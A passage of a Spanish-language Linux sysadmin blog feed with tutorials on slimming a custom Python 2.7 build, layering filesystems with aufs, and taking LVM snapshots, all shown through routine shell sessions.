&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ sudo rm lib/libpython2.7.a
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;1&lt;/span&gt;.8M    bin
73M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Continuamos mirando la carpeta mas grande, que es &lt;em&gt;lib/python2.7/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh lib/python2.7/* &lt;span class="p"&gt;|&lt;/span&gt; sort -h &lt;span class="p"&gt;|&lt;/span&gt; tail -5
&lt;span class="m"&gt;2&lt;/span&gt;.9M    lib/python2.7/encodings
&lt;span class="m"&gt;3&lt;/span&gt;.1M    lib/python2.7/idlelib
&lt;span class="m"&gt;3&lt;/span&gt;.4M    lib/python2.7/distutils
&lt;span class="m"&gt;3&lt;/span&gt;.5M    lib/python2.7/lib-dynload
29M     lib/python2.7/test
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es bastante inútil que el &lt;em&gt;runtime&lt;/em&gt; de &lt;em&gt;python&lt;/em&gt; incluya los tests que usan los desarrolladores de &lt;em&gt;python&lt;/em&gt;, y son 29 mb que podemos eliminar de forma segura.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ sudo rm -R lib/python2.7/test/
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;1&lt;/span&gt;.8M    bin
44M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si miramos el contenido de la carpeta con detenimiento, podemos ver que cada módulo tiene 3 versiones: &lt;em&gt;.py&lt;/em&gt;, &lt;em&gt;.pyc&lt;/em&gt; y &lt;em&gt;.pyo&lt;/em&gt;; se trata del módulo en versión código, compilado y optimizado, respectivamente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ ls -lh lib/python2.7/os.*
-rw-r--r--. &lt;span class="m"&gt;1&lt;/span&gt; root root 26K Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:43 lib/python2.7/os.py
-rw-r--r--. &lt;span class="m"&gt;1&lt;/span&gt; root root 26K Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:43 lib/python2.7/os.pyc
-rw-r--r--. &lt;span class="m"&gt;1&lt;/span&gt; root root 26K Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:43 lib/python2.7/os.pyo
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Realmente solo se necesita la versión &lt;em&gt;.py&lt;/em&gt;, siendo las otras para acelerar la carga del módulo. Los otros se crean al importar el módulo, y si es posible, se escriben de nuevo en la carpeta. Vamos a borrarlas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ find -name &lt;span class="s2"&gt;&amp;quot;*.pyo&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo xargs rm
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ find -name &lt;span class="s2"&gt;&amp;quot;*.pyc&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo xargs rm
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;1&lt;/span&gt;.8M    bin
21M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mucho mejor, pero... ¿sigue funcionando &lt;strong&gt;python&lt;/strong&gt;? Lo comprobamos como antes, y vemos que si. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ ./bin/python -V
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.11
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ ./bin/python -c &lt;span class="s2"&gt;&amp;quot;import os; print os.uname()&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Linux&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;foundry&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;3.10.0-327.10.1.el7.x86_64&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;#1 SMP Sat Jan 23 04:54:55 EST 2016&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;x86_64&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Empaquetado para usos futuros&lt;/h2&gt;
&lt;p&gt;Esta carpeta va a servir para todas las máquinas &lt;em&gt;CentOS&lt;/em&gt; y &lt;em&gt;RedHat&lt;/em&gt; versión 6, con la misma família de procesador (en este caso x86_64). Hacemos un fichero comprimido y lo ponemos a buen recaudo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry opt&lt;span class="o"&gt;]&lt;/span&gt;$ tar czf ~/python27.tar.gz python27/
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry opt&lt;span class="o"&gt;]&lt;/span&gt;$ ls -lh ~
total &lt;span class="m"&gt;7&lt;/span&gt;.2M
-rw-rw-r--. &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard &lt;span class="m"&gt;7&lt;/span&gt;.2M Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:01 python27.tar.gz
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry opt&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Poco mas de 7 mb... nada mal, ¿no?&lt;/p&gt;</content><category term="linux"></category><category term="redhat"></category><category term="centos"></category><category term="python"></category></entry><entry><title>Sistemas de ficheros multicapa con aufs</title><link href="https://www.linuxsysadmin.ml/2016/03/sistemas-de-ficheros-multicapa-con-aufs.html" rel="alternate"></link><published>2016-03-28T08:00:00+02:00</published><updated>2016-03-28T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-03-28:/2016/03/sistemas-de-ficheros-multicapa-con-aufs.html</id><summary type="html">&lt;p&gt;Trabajando con contenedores tenemos una parte que se repite: el sistema de ficheros base, que copiamos siempre. Otras veces nos puede interesar hacer un sistema capaz de descartar los cambios desde un punto inicial. Podemos crear una capa base de solo lectura y añadir otra capa de cambios con &lt;strong&gt;aufs …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trabajando con contenedores tenemos una parte que se repite: el sistema de ficheros base, que copiamos siempre. Otras veces nos puede interesar hacer un sistema capaz de descartar los cambios desde un punto inicial. Podemos crear una capa base de solo lectura y añadir otra capa de cambios con &lt;strong&gt;aufs&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La idea es crear un sistema de ficheros que sea el resultado de mezclar otros dos: una capa de solo lectura y una capa de cambios, que podría ser de lectura y escritura. Esta nueva capa puede, a su vez, servir de base para otro sistema de ficheros.&lt;/p&gt;
&lt;p&gt;De hecho, esta técnica de "apilado" se utiliza en la distribución de pendrive llamada &lt;a href="http://www.slax.org/"&gt;Slax&lt;/a&gt;. Mediante el apilado de módulos, mas una capa final de cambios, consiguen crear un sistema de ficheros linux entero, con una capa de cambios que se puede descartar en cualquier momento.&lt;/p&gt;
&lt;p&gt;Empezaremos con un sistema de ficheros simulado en una carpeta, que llamaremos &lt;em&gt;base&lt;/em&gt;. También pondremos una carpeta &lt;em&gt;unified&lt;/em&gt; que va a ser el sistema de ficheros resultante, y una carpeta &lt;em&gt;changes&lt;/em&gt; que va a alojar los cambios del sistema de ficheros respecto al sistema &lt;em&gt;base&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree
.
├── base
│   ├── bin
│   │   └── hello.sh
│   └── conf
│       └── hello.conf
├── changes
└── unified

&lt;span class="m"&gt;5&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para esta demostración nos vale poca cosa, por ejemplo un binario y su configuración. En casos algo mas complejos podría tratarse de una jaula entera de sistema operativo.&lt;/p&gt;
&lt;p&gt;La "aplicación" y su configuración son simples, se muestran como guía, para ver como lo evolucionamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat base/bin/hello.sh
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;source&lt;/span&gt; conf/hello.conf

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;!&amp;quot;&lt;/span&gt;
root@server:~# cat base/conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard&amp;quot;&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a crear el sistema combinado en la carpeta &lt;em&gt;unified&lt;/em&gt;, usando la &lt;em&gt;base&lt;/em&gt; como capa de solo lectura, y la carpeta &lt;em&gt;changes&lt;/em&gt; como la capa de lectura escritura.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount -t aufs -o br:changes&lt;span class="o"&gt;=&lt;/span&gt;rw:base&lt;span class="o"&gt;=&lt;/span&gt;ro none unified
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que la carpeta &lt;em&gt;unified&lt;/em&gt; es una unión de la capa base con la de cambios. Puesto que no hay cambios, por ahora las carpetas coinciden en contenido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree
.
├── base
│   ├── bin
│   │   └── hello.sh
│   └── conf
│       └── hello.conf
├── changes
└── unified
    ├── bin
    │   └── hello.sh
    └── conf
        └── hello.conf

&lt;span class="m"&gt;7&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De ahora en adelante, solo queda trabajar con el sistema de ficheros &lt;em&gt;unified&lt;/em&gt;, así que vamos a trabajar en esa carpeta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# &lt;span class="nb"&gt;cd&lt;/span&gt; unified/
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si ejecutamos el binario, vemos que reacciona como se supone que debe hacerlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# ./bin/hello.sh
Hello Gerard!
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En un momento dado, vemos que queremos modificar un fichero, por ejemplo, el de configuración, cambiando el parámetro &lt;strong&gt;NAME&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# cat conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard Monells&amp;quot;&lt;/span&gt;
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Efectivamente, el resultado es el esperado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# ./bin/hello.sh
Hello Gerard Monells!
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a crear nuevas carpetas y nuevos ficheros, por ejemplo, una carpeta &lt;em&gt;data&lt;/em&gt; con un fichero &lt;em&gt;greetings&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# mkdir data
root@server:~/unified# ./bin/hello.sh &amp;gt; data/greetings
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Volvemos al nivel de carpetas anteriores, para investigar lo que está pasando.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# &lt;span class="nb"&gt;cd&lt;/span&gt; ..
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que el sistema &lt;em&gt;base&lt;/em&gt; ha quedado intacto. De la misma forma, todas las modificaciones respecto a la base se han almacenado en la carpeta &lt;em&gt;changes&lt;/em&gt;. En conjunto, nos queda la carpeta &lt;em&gt;unified&lt;/em&gt; con la suma de ambos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree
.
├── base
│   ├── bin
│   │   └── hello.sh
│   └── conf
│       └── hello.conf
├── changes
│   ├── conf
│   │   └── hello.conf
│   └── data
│       └── greetings
└── unified
    ├── bin
    │   └── hello.sh
    ├── conf
    │   └── hello.conf
    └── data
        └── greetings

&lt;span class="m"&gt;10&lt;/span&gt; directories, &lt;span class="m"&gt;7&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es fácil intuir que el fichero &lt;em&gt;greetings&lt;/em&gt; es el de la capa de cambios, ya que no hay otro. En el caso del fichero &lt;em&gt;hello.conf&lt;/em&gt; modificado, se ha modificado el de la capa de cambios, y es el que vemos en el punto de montaje &lt;em&gt;unified&lt;/em&gt;, aunque hayan dos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat base/conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard&amp;quot;&lt;/span&gt;
root@server:~# cat unified/conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard Monells&amp;quot;&lt;/span&gt;
root@server:~# cat changes/conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard Monells&amp;quot;&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: el sistema de ficheros de solo lectura &lt;em&gt;base&lt;/em&gt; no tiene porque estar en una carpeta; podría tratarse se un sistema de fichero simulado montado en un fichero, montado mediante un &lt;strong&gt;mount -o loop&lt;/strong&gt;; por ejemplo, un sistema de ficheros &lt;strong&gt;squashfs&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;De hecho, como la capa &lt;em&gt;base&lt;/em&gt; no se modifica, nada nos impide crear otro sistema de ficheros, a base de sumar esta misma &lt;em&gt;base&lt;/em&gt; con otra capa de cambios.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir changes2 unified2
root@server:~# mount -t aufs -o br:changes2&lt;span class="o"&gt;=&lt;/span&gt;rw:base&lt;span class="o"&gt;=&lt;/span&gt;ro none unified2
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos dos sistemas de ficheros, &lt;em&gt;unified&lt;/em&gt; y &lt;em&gt;unified2&lt;/em&gt;, que comparten una capa &lt;em&gt;base&lt;/em&gt; común.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree
.
├── base
│   ├── bin
│   │   └── hello.sh
│   └── conf
│       └── hello.conf
├── changes
│   ├── conf
│   │   └── hello.conf
│   └── data
│       └── greetings
├── changes2
├── unified
│   ├── bin
│   │   └── hello.sh
│   ├── conf
│   │   └── hello.conf
│   └── data
│       └── greetings
└── unified2
    ├── bin
    │   └── hello.sh
    └── conf
        └── hello.conf

&lt;span class="m"&gt;14&lt;/span&gt; directories, &lt;span class="m"&gt;9&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso no supone mucho ahorro, ya que la capa base es pequeña, pero... ¿os imagináis que la capa base es una jaula entera resultado de un &lt;strong&gt;debootstrap&lt;/strong&gt;?&lt;/p&gt;
&lt;p&gt;De hecho, esta capa &lt;em&gt;base&lt;/em&gt; compartida no hay que copiarla, con lo que ganamos tiempo al crear una jaula grande, y además, si lo juntamos con &lt;strong&gt;squashfs&lt;/strong&gt; podemos ahorrar bastante espacio.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="mount"></category><category term="aufs"></category><category term="squashfs"></category><category term="debootstrap"></category></entry><entry><title>Haciendo snapshots con LVM</title><link href="https://www.linuxsysadmin.ml/2016/02/haciendo-snapshots-con-lvm.html" rel="alternate"></link><published>2016-02-15T08:30:00+01:00</published><updated>2016-02-15T08:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-02-15:/2016/02/haciendo-snapshots-con-lvm.html</id><summary type="html">&lt;p&gt;Una de las funcionalidades mas implementadas en los sistemas de ficheros de nueva generación es la capacidad de hacer &lt;em&gt;snapshots point-in-time&lt;/em&gt;. Sin embargo, no tenemos que renunciar a la estabilidad de los sistemas de ficheros tradicionales como &lt;strong&gt;ext4&lt;/strong&gt;; otras veces no es posible por requisitos del servicio que debe usarlo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Una de las funcionalidades mas implementadas en los sistemas de ficheros de nueva generación es la capacidad de hacer &lt;em&gt;snapshots point-in-time&lt;/em&gt;. Sin embargo, no tenemos que renunciar a la estabilidad de los sistemas de ficheros tradicionales como &lt;strong&gt;ext4&lt;/strong&gt;; otras veces no es posible por requisitos del servicio que debe usarlo.&lt;/p&gt;
&lt;p&gt;En este tutorial vamos a demostrar lo fácil que es hacer este tipo de &lt;em&gt;snapshots&lt;/em&gt;, usando como tecnología subyacente el &lt;strong&gt;logical volume manager&lt;/strong&gt;, de ahora en adelante, &lt;strong&gt;LVM&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Los únicos requisitos para seguir esta guía son el paquete &lt;strong&gt;lvm&lt;/strong&gt; y un disco físico sobre el que vamos a construir el &lt;em&gt;volume group&lt;/em&gt; que va a alojar los &lt;em&gt;logical volumes&lt;/em&gt;; al menos van a ser la partición original y algo de espacio para servir como volumen para el &lt;em&gt;snapshot&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Preparación&lt;/h2&gt;
&lt;p&gt;Empezamos instalando los requisitos software:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install lvm2
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  dmeventd libdevmapper-event1.02.1 liblvm2cmd2.02 libreadline5
Paquetes sugeridos:
  thin-provisioning-tools
Se instalarán los siguientes paquetes NUEVOS:
  dmeventd libdevmapper-event1.02.1 liblvm2cmd2.02 libreadline5 lvm2
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;5&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;1&lt;/span&gt;.530 kB de archivos.
Se utilizarán &lt;span class="m"&gt;3&lt;/span&gt;.898 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Suponiendo que el disco que vamos a usar es &lt;em&gt;/dev/sdb&lt;/em&gt;, vamos a acondicionarlo para que pueda actuar como &lt;em&gt;physical volume&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# pvcreate /dev/sdb
  Physical volume &lt;span class="s2"&gt;&amp;quot;/dev/sdb&amp;quot;&lt;/span&gt; successfully created
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a usar este &lt;em&gt;physical volume&lt;/em&gt; para crear el &lt;em&gt;volume group&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# vgcreate lvm /dev/sdb
  /proc/devices: No entry &lt;span class="k"&gt;for&lt;/span&gt; device-mapper found
  Volume group &lt;span class="s2"&gt;&amp;quot;lvm&amp;quot;&lt;/span&gt; successfully created
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a sacar un &lt;em&gt;logical volume&lt;/em&gt; para crear el sistema de ficheros que va a ser el objeto del &lt;em&gt;snapshot&lt;/em&gt;. El tamaño del volumen puede ser el que nos convenga, e incluso crecer según sea necesario. De momento, nos basta con 1 GB.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvcreate lvm -L 1G -n datos
  Logical volume &lt;span class="s2"&gt;&amp;quot;datos&amp;quot;&lt;/span&gt; created
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo formateamos como si de un disco mas se tratara.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkfs.ext4 /dev/lvm/datos
mke2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
Se está creando El sistema de ficheros con &lt;span class="m"&gt;262144&lt;/span&gt; 4k bloques y &lt;span class="m"&gt;65536&lt;/span&gt; nodos-i

UUID del sistema de ficheros: 1ad4e531-82de-4797-9968-28cb33b3badd
Respaldo del superbloque guardado en los bloques:
        &lt;span class="m"&gt;32768&lt;/span&gt;, &lt;span class="m"&gt;98304&lt;/span&gt;, &lt;span class="m"&gt;163840&lt;/span&gt;, &lt;span class="m"&gt;229376&lt;/span&gt;

Reservando las tablas de grupo: hecho
Escribiendo las tablas de nodos-i: hecho
Creando el fichero de transacciones &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8192&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;: hecho
Escribiendo superbloques y la información contable del sistema de ficheros: hecho

root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a asumir que nuestro servicio necesita dejar sus datos en &lt;em&gt;/data&lt;/em&gt;; como no existe, vamos a crearlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /data
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso es montar ese volumen en su sitio, en este caso, en &lt;em&gt;/data&lt;/em&gt;. Se deja como ejercicio personal ponerlo en el &lt;em&gt;/etc/fstab&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount /dev/lvm/datos /data/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear algo de contenido en la carpeta para simular los datos que dejaría el servicio que supuestamente usaría esta carpeta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; /data/a
root@server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; /data/b
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creación del snapshot&lt;/h2&gt;
&lt;p&gt;Hacer un &lt;em&gt;snapshot&lt;/em&gt; es tan fácil como invocar el binario &lt;strong&gt;lvcreate&lt;/strong&gt; con el parámetro &lt;em&gt;-s&lt;/em&gt;, especificando el tamaño, el nombre y el volumen objetivo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvcreate -L 100M -n datos-snap -s /dev/lvm/datos
  Logical volume &lt;span class="s2"&gt;&amp;quot;datos-snap&amp;quot;&lt;/span&gt; created
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El volumen &lt;em&gt;datos-snap&lt;/em&gt; solo contiene las diferencias con el volumen original, así que no necesita tener el mismo tamaño que el original. Sin embargo, si hubiera mas de 100 MB de cambios, este &lt;em&gt;snapshot&lt;/em&gt; quedaría inválido.&lt;/p&gt;
&lt;p&gt;De momento, creo que con 100 MB va a ser suficiente, ya que solo pretendo sacar un fichero comprimido de ese &lt;em&gt;snapshot&lt;/em&gt;, eliminándolo después. Un tamaño seguro habría sido el mismo que el volumen original. Sin embargo, como se trata de otro volumen &lt;strong&gt;LVM&lt;/strong&gt;, podremos extenderla a posteriori con &lt;em&gt;lvextend&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a analizar el contenido; lo montamos en una carpeta cualquiera para ver su contenido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount /dev/lvm/datos-snap /mnt/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es fácil de verificar que tienen el mismo contenido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# grep . /data/* /mnt/*
/data/a:1
/data/b:1
/mnt/a:1
/mnt/b:1
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a continuar simulando que el servicio escribe en el volumen original, por ejemplo, modificando uno de los ficheros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; &amp;gt; /data/a
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y verificamos que el &lt;em&gt;snapshot point-in-time&lt;/em&gt; se quedó en el momento temporal en el que lo hicimos, quedando como estaba entonces:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# grep . /data/* /mnt/*
/data/a:2
/data/b:1
/mnt/a:1
/mnt/b:1
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


